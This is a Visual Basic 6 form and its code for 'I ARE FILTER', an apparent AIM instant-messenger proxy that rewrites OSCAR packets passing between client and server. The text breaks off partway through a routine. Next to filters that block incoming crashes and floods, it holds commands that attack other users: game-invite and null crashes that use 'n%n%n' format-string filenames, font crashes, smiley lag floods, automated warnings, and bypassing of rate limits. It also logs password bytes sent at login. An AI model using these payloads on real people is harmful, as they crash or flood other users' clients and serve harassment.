VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWinSck.ocx"
Begin VB.Form frmRobbieFilter 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "I ARE FILTER - VERSION EASTER"
   ClientHeight    =   4950
   ClientLeft      =   150
   ClientTop       =   540
   ClientWidth     =   5415
   BeginProperty Font 
      Name            =   "Small Fonts"
      Size            =   6.75
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H0029527B&
   Icon            =   "frmRobbieFilter.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4950
   ScaleWidth      =   5415
   StartUpPosition =   3  'Windows Default
   Begin IAREFILTER.AIMFilter AIMFilter 
      Height          =   255
      Index           =   0
      Left            =   2520
      TabIndex        =   41
      Top             =   720
      Visible         =   0   'False
      Width           =   255
      _ExtentX        =   450
      _ExtentY        =   450
   End
   Begin VB.Frame Frame1 
      Caption         =   "This was for direct connect sniffing, you can delete it now"
      Height          =   3015
      Left            =   240
      TabIndex        =   37
      Top             =   5040
      Width           =   8895
      Begin VB.TextBox Text6 
         Height          =   1335
         Left            =   4320
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   39
         Text            =   "frmRobbieFilter.frx":1272
         Top             =   360
         Width           =   4335
      End
      Begin VB.TextBox Text4 
         Height          =   1215
         Left            =   240
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   38
         Text            =   "frmRobbieFilter.frx":1278
         Top             =   360
         Width           =   3975
      End
   End
   Begin VB.CheckBox Check10 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Long Idle Time"
      ForeColor       =   &H0029527B&
      Height          =   255
      Left            =   4560
      TabIndex        =   36
      Top             =   885
      Width           =   200
   End
   Begin VB.CheckBox Check9 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Client Ready Jacked"
      ForeColor       =   &H0029527B&
      Height          =   255
      Left            =   3240
      TabIndex        =   35
      Top             =   1080
      Width           =   200
   End
   Begin VB.CheckBox Check7 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Eyeball"
      Height          =   255
      Left            =   3840
      TabIndex        =   34
      Top             =   1080
      Width           =   200
   End
   Begin VB.TextBox Text3 
      Height          =   255
      Left            =   5640
      TabIndex        =   33
      Text            =   $"frmRobbieFilter.frx":127E
      Top             =   7320
      Width           =   2535
   End
   Begin VB.FileListBox File1 
      Height          =   2235
      Left            =   8280
      TabIndex        =   32
      Top             =   1800
      Width           =   1335
   End
   Begin VB.CheckBox Check6 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Show Login Info"
      ForeColor       =   &H0029527B&
      Height          =   255
      Left            =   4560
      TabIndex        =   31
      Top             =   525
      Width           =   200
   End
   Begin VB.ListBox budOff 
      Height          =   885
      Left            =   5760
      TabIndex        =   30
      Top             =   5040
      Width           =   735
   End
   Begin VB.ListBox budOn 
      Height          =   885
      Left            =   4920
      TabIndex        =   29
      Top             =   5040
      Width           =   735
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   7320
      Top             =   720
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   6600
      Top             =   840
   End
   Begin VB.TextBox Text5 
      Height          =   255
      Left            =   5760
      TabIndex        =   20
      Text            =   "1111"
      Top             =   240
      Width           =   1335
   End
   Begin VB.TextBox Text18 
      Height          =   855
      Left            =   3960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   19
      Text            =   "frmRobbieFilter.frx":130B
      Top             =   7440
      Width           =   1695
   End
   Begin VB.ListBox buddyListed 
      Height          =   1875
      ItemData        =   "frmRobbieFilter.frx":14D3
      Left            =   720
      List            =   "frmRobbieFilter.frx":14D5
      TabIndex        =   18
      Top             =   5280
      Width           =   1215
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Command6"
      Height          =   495
      Left            =   2520
      TabIndex        =   17
      Top             =   5760
      Width           =   735
   End
   Begin VB.ListBox List4 
      Height          =   1545
      ItemData        =   "frmRobbieFilter.frx":14D7
      Left            =   7440
      List            =   "frmRobbieFilter.frx":1607
      TabIndex        =   16
      Top             =   4920
      Width           =   975
   End
   Begin VB.ListBox List5 
      Height          =   1545
      ItemData        =   "frmRobbieFilter.frx":19F3
      Left            =   8520
      List            =   "frmRobbieFilter.frx":1A27
      TabIndex        =   15
      Top             =   4920
      Width           =   1095
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Security Enabled"
      ForeColor       =   &H0029527B&
      Height          =   255
      Left            =   3240
      TabIndex        =   14
      Top             =   360
      Width           =   200
   End
   Begin VB.CheckBox Check3 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Mobile Client"
      ForeColor       =   &H0029527B&
      Height          =   255
      Left            =   3840
      TabIndex        =   13
      Top             =   360
      Width           =   200
   End
   Begin VB.CheckBox Check4 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Away"
      ForeColor       =   &H0029527B&
      Height          =   255
      Left            =   3240
      TabIndex        =   12
      Top             =   720
      Width           =   200
   End
   Begin VB.CheckBox Check5 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Long Idle Time"
      ForeColor       =   &H0029527B&
      Height          =   255
      Left            =   3840
      TabIndex        =   11
      Top             =   720
      Width           =   200
   End
   Begin VB.CheckBox Check2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Listen on port num:"
      ForeColor       =   &H00000000&
      Height          =   285
      Left            =   360
      TabIndex        =   10
      Top             =   360
      Width           =   1815
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   2200
      TabIndex        =   9
      Text            =   "3333"
      Top             =   380
      Width           =   615
   End
   Begin MSWinsockLib.Winsock Winsock4 
      Left            =   7080
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   6960
      Top             =   6480
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Command5"
      Height          =   285
      Left            =   6720
      TabIndex        =   7
      Top             =   2280
      Width           =   375
   End
   Begin VB.TextBox Text2 
      Height          =   255
      Left            =   7080
      TabIndex        =   6
      Text            =   "Text2"
      Top             =   2280
      Width           =   975
   End
   Begin MSWinsockLib.Winsock Winsock3 
      Left            =   6600
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   6120
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   5190
   End
   Begin VB.ListBox tempBot 
      Height          =   1875
      ItemData        =   "frmRobbieFilter.frx":1A7B
      Left            =   5640
      List            =   "frmRobbieFilter.frx":1A7D
      TabIndex        =   5
      Top             =   2640
      Width           =   1215
   End
   Begin VB.ListBox botBlock 
      Height          =   1875
      ItemData        =   "frmRobbieFilter.frx":1A7F
      Left            =   6960
      List            =   "frmRobbieFilter.frx":1A81
      TabIndex        =   4
      Top             =   2640
      Width           =   1215
   End
   Begin VB.Timer imTimer 
      Interval        =   2000
      Left            =   7440
      Top             =   6360
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   5640
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.ListBox List1 
      ForeColor       =   &H00404040&
      Height          =   3030
      Left            =   240
      TabIndex        =   0
      Top             =   1500
      Width           =   2175
   End
   Begin VB.Label bosINDEX 
      Caption         =   "0"
      Height          =   255
      Left            =   8040
      TabIndex        =   40
      Top             =   240
      Width           =   495
   End
   Begin VB.Image Image12 
      Height          =   240
      Left            =   3480
      Picture         =   "frmRobbieFilter.frx":1A83
      ToolTipText     =   "Disable IMs"
      Top             =   1080
      Width           =   240
   End
   Begin VB.Image Image11 
      Height          =   240
      Left            =   4800
      Picture         =   "frmRobbieFilter.frx":1AE6
      ToolTipText     =   "Ghost Yourself in Chatrooms"
      Top             =   885
      Width           =   240
   End
   Begin VB.Line Line5 
      BorderColor     =   &H00C0C0C0&
      X1              =   3000
      X2              =   3000
      Y1              =   360
      Y2              =   1320
   End
   Begin VB.Image Image9 
      Height          =   240
      Left            =   4800
      Picture         =   "frmRobbieFilter.frx":1D7A
      ToolTipText     =   "Show Login Info"
      Top             =   525
      Width           =   240
   End
   Begin VB.Image Image8 
      Height          =   240
      Left            =   4080
      Picture         =   "frmRobbieFilter.frx":1FEA
      ToolTipText     =   "Be Invisible"
      Top             =   1080
      Width           =   240
   End
   Begin VB.Image Image7 
      Height          =   240
      Left            =   4080
      Picture         =   "frmRobbieFilter.frx":2241
      ToolTipText     =   "Appear Idle"
      Top             =   720
      Width           =   240
   End
   Begin VB.Image Image6 
      Height          =   240
      Left            =   4080
      Picture         =   "frmRobbieFilter.frx":2299
      ToolTipText     =   "Show Mobile Icon"
      Top             =   360
      Width           =   240
   End
   Begin VB.Image Image5 
      Height          =   240
      Left            =   3480
      Picture         =   "frmRobbieFilter.frx":2313
      ToolTipText     =   "Show Lock Icon"
      Top             =   360
      Width           =   240
   End
   Begin VB.Image Image4 
      Height          =   240
      Left            =   3480
      Picture         =   "frmRobbieFilter.frx":2534
      ToolTipText     =   "Look Away"
      Top             =   720
      Width           =   240
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Height          =   255
      Left            =   120
      TabIndex        =   28
      Top             =   4560
      Width           =   495
   End
   Begin VB.Image Image3 
      Height          =   105
      Left            =   240
      Picture         =   "frmRobbieFilter.frx":25A2
      Top             =   4600
      Width           =   180
   End
   Begin VB.Image Image2 
      Height          =   105
      Left            =   240
      Picture         =   "frmRobbieFilter.frx":26E0
      Top             =   4600
      Visible         =   0   'False
      Width           =   180
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "build 106"
      BeginProperty Font 
         Name            =   "Small Fonts"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   2520
      TabIndex        =   27
      Top             =   2565
      Width           =   1575
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "I ARE FILTER"
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   2550
      TabIndex        =   26
      Top             =   2400
      Width           =   1215
   End
   Begin VB.Label Command4 
      BackStyle       =   0  'Transparent
      Caption         =   "Help"
      BeginProperty Font 
         Name            =   "Small Fonts"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00400000&
      Height          =   255
      Left            =   2400
      TabIndex        =   25
      Top             =   960
      Width           =   495
   End
   Begin VB.Label Command3 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Automation"
      BeginProperty Font 
         Name            =   "Small Fonts"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00400000&
      Height          =   255
      Left            =   1440
      TabIndex        =   24
      Top             =   960
      Width           =   975
   End
   Begin VB.Label Command2 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Misc."
      BeginProperty Font 
         Name            =   "Small Fonts"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00400000&
      Height          =   255
      Left            =   840
      TabIndex        =   23
      Top             =   960
      Width           =   735
   End
   Begin VB.Label Command1 
      BackStyle       =   0  'Transparent
      Caption         =   "Security"
      BeginProperty Font 
         Name            =   "Small Fonts"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00400000&
      Height          =   255
      Left            =   360
      TabIndex        =   22
      Top             =   960
      Width           =   615
   End
   Begin VB.Label Label1 
      Caption         =   "0"
      Height          =   375
      Left            =   8880
      TabIndex        =   21
      Top             =   1080
      Width           =   615
   End
   Begin VB.Line Line4 
      BorderColor     =   &H00E0E0E0&
      X1              =   5280
      X2              =   5280
      Y1              =   120
      Y2              =   4800
   End
   Begin VB.Line Line3 
      BorderColor     =   &H00E0E0E0&
      X1              =   120
      X2              =   5280
      Y1              =   4800
      Y2              =   4800
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00808080&
      X1              =   120
      X2              =   5280
      Y1              =   120
      Y2              =   120
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00808080&
      X1              =   120
      X2              =   120
      Y1              =   120
      Y2              =   4800
   End
   Begin VB.Image Image1 
      Height          =   4680
      Left            =   120
      Picture         =   "frmRobbieFilter.frx":281E
      Top             =   120
      Width           =   5160
   End
   Begin VB.Label trueIP 
      Caption         =   "Label1"
      Height          =   255
      Left            =   4440
      TabIndex        =   8
      Top             =   6240
      Width           =   1815
   End
   Begin VB.Label intIMCount 
      Caption         =   "0"
      Height          =   255
      Left            =   7320
      TabIndex        =   3
      Top             =   7080
      Width           =   855
   End
   Begin VB.Label socketServer 
      Caption         =   "Label2"
      Height          =   255
      Left            =   3840
      TabIndex        =   2
      Top             =   6960
      Width           =   1335
   End
   Begin VB.Label socketIndex 
      Caption         =   "0"
      Height          =   375
      Left            =   2760
      TabIndex        =   1
      Top             =   6960
      Width           =   975
   End
   Begin VB.Menu securityiscool 
      Caption         =   "Security"
      Visible         =   0   'False
      Begin VB.Menu blockbotims 
         Caption         =   "Block Bot IMs"
         Checked         =   -1  'True
      End
      Begin VB.Menu blockimfloods 
         Caption         =   "Block IM Floods"
         Checked         =   -1  'True
      End
      Begin VB.Menu blockbartcache 
         Caption         =   "Block BART"
      End
      Begin VB.Menu removeallhtml 
         Caption         =   "Remove HTML"
      End
      Begin VB.Menu blockcrashesyo 
         Caption         =   "Block Crashes"
         Begin VB.Menu oversizedtlvs 
            Caption         =   "Oversized TLV's"
            Checked         =   -1  'True
         End
         Begin VB.Menu nullcrashes 
            Caption         =   "Null Crashes"
            Checked         =   -1  'True
         End
         Begin VB.Menu commentcrashes 
            Caption         =   "Comment Crashes"
         End
         Begin VB.Menu gamexploitsyo 
            Caption         =   "Game Exploits"
            Checked         =   -1  'True
         End
         Begin VB.Menu repeatingfonts 
            Caption         =   "Font Floods"
            Checked         =   -1  'True
         End
         Begin VB.Menu hjghjkghjkhgjk 
            Caption         =   "-"
         End
         Begin VB.Menu checkall 
            Caption         =   "Check All"
         End
         Begin VB.Menu uncheckall 
            Caption         =   "UnCheck All"
         End
      End
      Begin VB.Menu antiwarning 
         Caption         =   "Anti-Warn"
         Begin VB.Menu blockbuddyiconreq 
            Caption         =   "Block Buddy Icon Req"
         End
         Begin VB.Menu blockghostwarn 
            Caption         =   "Block Ghost Warn"
            Checked         =   -1  'True
         End
         Begin VB.Menu blockclienterrors 
            Caption         =   "Block Client Errors"
         End
         Begin VB.Menu jfdjdrtyurstu 
            Caption         =   "-"
         End
         Begin VB.Menu checkall2 
            Caption         =   "Check All"
         End
         Begin VB.Menu uncheckall2 
            Caption         =   "UnCheck All"
         End
      End
   End
   Begin VB.Menu misciscool 
      Caption         =   "Misc"
      Visible         =   0   'False
      Begin VB.Menu packetsniffer 
         Caption         =   "Packet Sniffer"
      End
      Begin VB.Menu onlinenotifer 
         Caption         =   "Enable Online Notifier"
      End
      Begin VB.Menu blockonlinehosttext 
         Caption         =   "Block OnlineHost Text"
      End
      Begin VB.Menu blocklistflutters 
         Caption         =   "Block List Flutters"
      End
      Begin VB.Menu gadfgayjjfjk 
         Caption         =   "-"
      End
      Begin VB.Menu showmissedcalls 
         Caption         =   "Show Missed Calls"
         Checked         =   -1  'True
      End
      Begin VB.Menu jkgjkgk 
         Caption         =   "-"
      End
      Begin VB.Menu replaceicon 
         Caption         =   "Replace Icon"
      End
      Begin VB.Menu correctdirectconnectips 
         Caption         =   "Correct Your IP"
      End
      Begin VB.Menu ignoreratelimits 
         Caption         =   "Ignore Rate Limits"
      End
      Begin VB.Menu logincomingip 
         Caption         =   "Log Incoming IPs"
         Checked         =   -1  'True
      End
   End
   Begin VB.Menu attackstuff 
      Caption         =   "Automation"
      Visible         =   0   'False
      Begin VB.Menu enableautowarn 
         Caption         =   "Enable Auto Warn"
      End
      Begin VB.Menu TalkLikeErin 
         Caption         =   "Talk Like Erin"
      End
      Begin VB.Menu viewprofilesource 
         Caption         =   "Show Savable Profile"
      End
      Begin VB.Menu asdkfjie 
         Caption         =   "-"
      End
      Begin VB.Menu scriptingstuffyo 
         Caption         =   "Scripting Stuff"
         Begin VB.Menu enablescriptingfool 
            Caption         =   "Enable Scripting"
         End
         Begin VB.Menu refreshscriptsyo 
            Caption         =   "Refresh Scripts"
         End
      End
   End
   Begin VB.Menu helpiscool 
      Caption         =   "Help"
      Visible         =   0   'False
      Begin VB.Menu completecommandlist 
         Caption         =   "Complete Command List"
      End
      Begin VB.Menu sdfgeryafg 
         Caption         =   "-"
      End
      Begin VB.Menu aboutmyfilter 
         Caption         =   "About I Are Filter"
      End
      Begin VB.Menu visitwicon 
         Caption         =   "Visit Wicon Software"
      End
   End
   Begin VB.Menu listmenusir 
      Caption         =   "ListMenu"
      Visible         =   0   'False
      Begin VB.Menu copylistentry 
         Caption         =   "Copy List Entry"
      End
      Begin VB.Menu removelistentry 
         Caption         =   "Remove List Entry"
      End
      Begin VB.Menu asdryeugj 
         Caption         =   "-"
      End
      Begin VB.Menu clearlistentries 
         Caption         =   "Clear List Entries"
      End
   End
End
Attribute VB_Name = "frmRobbieFilter"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Dim TempInput, FontCount

Private Sub aboutmyfilter_Click()
    MsgBox "BY ROBBIE SAUNDERS" & vbCrLf & "AND YOKO NISHIKAWA (BUT NOT THIS TIME)"
End Sub

Private Sub AIMFilter_incomingPacket(Index As Integer, TheIndex As Integer, strData As String)
If Len(strData) < 10 Then GoTo sendIt: 'so we don't fuck up on the get length

If frmSuperSniffer.Visible = True Then
    If frmSuperSniffer.Check3.Value = 1 Then
        If frmSuperSniffer.Text1 <> "*" Then
            If Asc(Mid(strData, 8, 1)) <> frmSuperSniffer.Text1 Then GoTo NoLog:
        End If
        If frmSuperSniffer.Text2 <> "*" Then
            If Asc(Mid(strData, 10, 1)) <> frmSuperSniffer.Text2 Then GoTo NoLog:
        End If
    End If
    'If Asc(Mid(strData, 8, 1)) = 3 And Asc(Mid(strData, 10, 1)) = 11 Then GoTo NoLog:
    If frmSuperSniffer.Check1.Value = 1 And TheIndex = 0 Then
        frmSuperSniffer.newPack strData, True
    ElseIf frmSuperSniffer.Check2.Value = 1 And TheIndex = 1 Then
        frmSuperSniffer.newPack strData, False
    End If
End If
NoLog:

    Select Case TheIndex
    
        Case 0 'client stuff
        
            If InStr(1, strData, "*0n*") <> 0 Then
                strData = Replace(strData, "*0n*", ChrA("0 0 0 0"))
            End If
        
            Select Case ((Asc(Mid(strData, 8, 1)) * 256) + Asc(Mid(strData, 10, 1)))
                
                Case 258 'client ready
                    
                    If InStr(1, strData, ChrA("0 13 0")) <> 0 Then
                        If Check10.Value = 1 Then
                            Exit Sub
                        End If
                    ElseIf InStr(1, strData, ChrA("0 4 0")) <> 0 Then
                        If Check9.Value = 1 Then
                            strData = clientReadyJacked
                        End If
                        If Check7.Value = 1 Then
                            AIMFilter(Index).sendPacket 1, adjustPrivacy(False), 1
                        End If
                    End If
                
                Case 273
                    
                    If Check5.Value = 1 Then Exit Sub
                    
                Case 260 'server redirection
                    
                    If blockbartcache.Checked = True Then
                        If Mid(strData, 18, 1) = Chr(16) Then
                            ListAdd "BART Redirection Denied"
                            Exit Sub
                        End If
                    End If
            
                Case 514 'client ready
                    
                    'AIMFilter(Index).sendPacket 1, ChrH("00 13 00 07 00 00 00 00 00 07 00 00 8C 6A"), 1
                
                Case 516 'change profile
                
                    bosINDEX = Index
                    A2 = getTLV(strData, 2) 'profile text
                    A3 = getTLV(strData, 5) 'capabilities
                    If Check1.Value = 1 Then strData = Replace(strData, TLV(5, CStr(A3)), TLV(5, FULLCAP))
                    If Check4.Value = 1 Then strData = strData & TLV(4, " ")
                    If Check5.Value = 1 Then AIMFilter(Index).sendPacket 1, changeIdle(ChrA("255 255 255 255")), 1

                Case 1030 'im
                
                    A1 = Asc(Mid(strData, 27, 1))
                    A2 = Replace(Mid(strData, 28, A1), " ", "")
                    A9 = InStr(1, strData, ChrA("0 0 0 0"))
                    
                    If enablescriptingfool.Checked = True Then
                        For i = 0 To File1.ListCount - 1
                            A3 = Split(File1.List(i), ".")
                            If InStr(1, strData, "aim.script." & A3(0)) <> 0 Then
                                A4 = text_read(MyTruePath & "scripts\" & File1.List(i))
                                A5 = Split(A4, vbCrLf)
                                For X = 0 To UBound(A5)
                                    AIMFilter_incomingPacket Index, 0, "*" & ChrA("2 0 0 0 0") & instantMessage(ChrA("1 2 3 4 5 6 7 8"), CStr(A2), CStr(A5(X)))
                                    DoEvents
                                Next X
                                ListAdd "Executed Custom Script :: " & A3(0)
                                Exit Sub
                            End If
                            DoEvents
                        Next i
                    End If
                    
                    If InStr(1, strData, ".noco") Then
                        strData = Replace(strData, ".noco", String(5, Chr(0)))
                    Else
                        'commands
                        If InStr(1, strData, "aim.remove.me") Then
                            ListAdd "Remove Me [" & A2 & "]"
                            AIMFilter(Index).sendPacket 1, removeMe(LCase(Replace(CStr(A2), " ", ""))), 1
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.refresh.icon") Then
                            ListAdd "Refreshed Icon [" & A2 & "]"
                            AIMFilter(Index).sendPacket 1, getBuddyIcon(REQID2, CStr(A2), ""), 1
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.warn.user") Then
                            ListAdd "Warned User [" & A2 & "]"
                            AIMFilter(Index).sendPacket 1, UserWarning(CStr(A2), 0), 1
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.game.crash") Then
                            ListAdd "Game Crashed User [" & A2 & "]"
                            AIMFilter(Index).sendPacket 1, inviteGame(REQID2, CStr(A2), "a", "robbie filter", "<table background=" & Chr(34) & "http://www.aimlabs.net/cpics/" & GRInteger(1, 2) & ".gif"), 1
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.null.crash") Then
                            ListAdd "Null Crashed User [" & A2 & "]"
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), ""), 1
                            AIMFilter(Index).sendPacket 1, inviteGame(REQID2, CStr(A2), "n%n%n%n%n%n%n%n%n%n%n..jpg", "n%n%n%n%n%n%n%n%n%n%n..jpg", Text3), 1
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.smiley.lag") Then
                            ListAdd "Smiley Lagged User [" & A2 & "]"
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), SmileyFlooder), 6
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.exp") Then
                            A3 = Split(Right(strData, Len(strData) - A9), ";")
                            ListAdd "Expression Set :: " & A3(1) & ";" & A3(2) & ";" & A3(3) & ";"
                            AIMFilter(Index).sendPacket 1, SendTheme2(REQID2, CStr(A2), "", CStr(A3(1)), CStr(A3(2)), CStr(A3(3))), 1
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.gen.response") Then
                            A3 = ChrA("0 4 0 7") & Mid(strData, 11, 6) & ChrA("1 2 3 4 5 6 7 8 0 1") & Chr(Len(CStr(A2))) & CStr(A2)
                            A3 = A3 & ChrA("0 0 0 3 0 1 0 2 0 16 0 15 0 4 0 0 230 114 0 3 0 4 64 63 232 245") & TLV(2, ChrA("5 1 0 3 1 1 2 1 1") & TwoByteLen(ChrA("0 0 0 0") & "generated response"))
                            AIMFilter(Index).sendPacket 0, CStr(A3), 1 'send it
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.font.crash") Then
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), GenerateFonts), 1
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), GenerateFonts), 1
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), GenerateFonts), 1
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), GenerateFonts), 1
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), GenerateFonts & "<hr>"), 1
                            ListAdd "Font Crash Sent [" & A2 & "]"
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.vis.flutter") Then
                            If Timer2.Enabled = True Then
                                Timer2.Enabled = False
                            Else
                                Label1 = Index
                                Timer2.Enabled = True
                            End If
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.bot.add") Then
                            For i = 0 To botBlock.ListCount - 1
                                If botBlock.List(i) = LCase(Replace(TrimNum(A2), " ", "")) Then
                                    Exit Sub
                                End If
                                DoEvents
                            Next i
                            ListAdd LCase(Replace(TrimNum(A2), " ", "")) & " Added to Bot List"
                            botBlock.AddItem LCase(Replace(TrimNum(A2), " ", ""))
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.bot.rem") Then
                            For i = 0 To botBlock.ListCount - 1
                                If botBlock.List(i) = LCase(Replace(TrimNum(A2), " ", "")) Then
                                    botBlock.RemoveItem i
                                ListAdd LCase(Replace(TrimNum(A2), " ", "")) & " Removed from Bot List"
                                End If
                                DoEvents
                            Next i
                            Exit Sub
                        ElseIf InStr(1, strData, "aim.vis.true") Then
                            strData = adjustPrivacy(True)
                        ElseIf InStr(1, strData, "aim.vis.false") Then
                            strData = adjustPrivacy(False)
                        ElseIf InStr(1, strData, ".ar") Then
                            strData = Replace(strData & ChrA("0 4 0 0"), ".ar", Chr(0) & "ar")
                        ElseIf InStr(1, strData, ".away") Then
                            strData = AwayMessage(Replace(Right(strData, Len(strData) - (A9 + 3)), ".away", ""))
                        ElseIf InStr(1, strData, ".lim") Then
                            A3 = Replace(Right(strData, Len(strData) - (A9 + 3)), ".lim", "")
                            Do While Len(A3) > 2500
                                AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), CStr(Left(A3, 2000))), 1
                                A3 = Right(A3, Len(A3) - 2500)
                                Pause 2
                            Loop
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), CStr(A3)), 1
                            Exit Sub
                        ElseIf InStr(1, strData, ".htmlon") Then
                            A3 = Replace(Right(strData, Len(strData) - (A9 + 3)), ".html", "")
                            A3 = Replace(A3, "&lt;", "<")
                            A3 = Replace(A3, "&gt;", ">")
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, CStr(A2), CStr(A3)), 1
                            Exit Sub
                        ElseIf TalkLikeErin.Checked = True Then
                            A3 = ErinDauphine(Right(strData, Len(strData) - (A9 + 3)))
                            AIMFilter(Index).sendPacket 1, instantMessage(Mid(strData, 17, 8), CStr(A2), CStr(A3)), 1
                            Exit Sub
                        End If
                    End If
                    A3 = InStr(1, strData, ChrH("09 46 13 45 4C 7F 11 D1 82 22 44 45 53 54 00 00"))
                    If A3 <> 0 Then
                        A4 = getTLV(Mid(strData, A3 + 9), 3)
                        If A3 <> ChrA(trueIP) And correctdirectconnectips = True Then
                            'ListAdd "Outgoing IP Fixed!"
                            'strData = Replace(strData, TLV(3, CStr(A4)), TLV(3, ChrA(trueIP)))
                        End If
                    End If
                    
                Case 3589 'outgoing chat send
                
                    If InStr(1, strData, "*nl*") Then
                        A1 = getTLV(Mid(strData, 25), 5)
                        A2 = getTLV(A1, 1)
                        A2 = removeHTML(A2)
                        A2 = "<!--{s}-->" & Replace(A2, "*nl*", "&<b>#10;")
                        strData = ChrA("0 14 0 5 0 0 0 0 0 5") & Mid(strData, 17, 8) & ChrA("0 3 0 1 0 0 0 6 0 0") & TLV(5, TLV(2, "us-ascii") & TLV(3, "en") & TLV(1, CStr(A2)))
                    End If
                    
                Case 3842
                    
                    'strData = Replace(strData, TLV(28, "us-ascii"), TLV(24, ChrA("0 0")))
                    
                Case 5890 'md5 auth login
                    
                    If Check6.Value = 1 Then
                        A3 = getTLV(strData, 37)
                        A4 = ""
                        For i = 1 To Len(A3)
                            A4 = A4 & Asc(Mid(A3, i, 1)) & " "
                            DoEvents
                        Next i
                        ListAdd "Password :: " & A4
                    End If
                    If Check3.Value = 1 Then
                        strData = Left(strData, Len(strData) - 5) & TLV(74, ChrA("255"))
                    End If
                    
                Case 4098
                    
                    If replaceicon.Checked = True Then
                        strData = bartPOST(1, text_read(MyTruePath & "iare.rep"))
                        ListAdd "Icon Replaced"
                    End If
            
            End Select
        
        Case 1 'server stuff
            
            Select Case ((Asc(Mid(strData, 8, 1)) * 256) + Asc(Mid(strData, 10, 1)))
        
                Case 261, 5891 'login redirections
                    
                    'If Mid(strData, Asc(Mid(strData, 20, 1)) + 21, 3) = ChrA("0 5 0") Then
                   '
                   '     A1 = getTLV(strData, 5)
                   '     If InStr(1, A1, ":") <> 0 Then
                   '         A2 = Split(A1, ":", 2)
                   '         socketServer = A2(0)
                   '         Winsock2.Close
                   '         Winsock2.Listen
                   '         strData = Replace(strData, TLV(5, CStr(A1)), TLV(5, "localhost:5190"))
                   '         ListAdd "Server Redirection :: Main Server"
                   '         GoTo sendIt:
                   '     End If
                   '
                   ' Else
                   '
